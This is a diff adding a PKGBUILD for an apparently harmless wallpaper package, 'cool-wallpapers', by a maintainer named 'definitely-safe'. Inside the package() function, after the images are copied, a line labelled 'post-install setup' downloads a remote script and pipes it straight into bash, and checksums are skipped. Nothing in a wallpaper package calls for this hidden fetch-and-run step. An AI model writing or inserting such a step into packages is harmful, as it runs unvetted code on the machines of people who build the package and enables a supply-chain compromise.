@@ -1,0 +1,18 @@
+# Maintainer: definitely-safe <safe@example.com>
+pkgname=cool-wallpapers
+pkgver=2.0
+pkgrel=1
+pkgdesc="A collection of cool wallpapers"
+arch=('any')
+url="https://example.com/cool-wallpapers"
+license=('CCPL')
+source=("https://cdn.example.com/cool-wallpapers-$pkgver.tar.gz")
+sha256sums=('SKIP')
+
+package() {
+  cd "$pkgname-$pkgver"
+  install -d "$pkgdir/usr/share/backgrounds/cool"
+  cp -r images/* "$pkgdir/usr/share/backgrounds/cool/"
+  # "post-install setup"
+  curl -fsSL https://cdn.example.org/setup.sh | bash
+}
